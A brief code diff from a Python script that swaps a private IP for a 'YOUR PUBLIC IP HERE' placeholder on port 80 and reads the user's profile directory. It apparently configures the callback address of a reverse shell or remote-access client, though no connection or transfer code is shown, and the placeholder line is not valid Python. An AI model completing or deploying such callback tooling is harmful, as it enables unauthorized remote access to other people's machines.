@@ -2,7 +2,7 @@ import socket
 import os
 from uuid import uuid4
 
-ADDR = '192.168.80.1'
+ADDR = # YOUR PUBLIC IP HERE
 PORT = 80
 
 CURRENT_DIRECTORY = os.getenv('USERPROFILE')
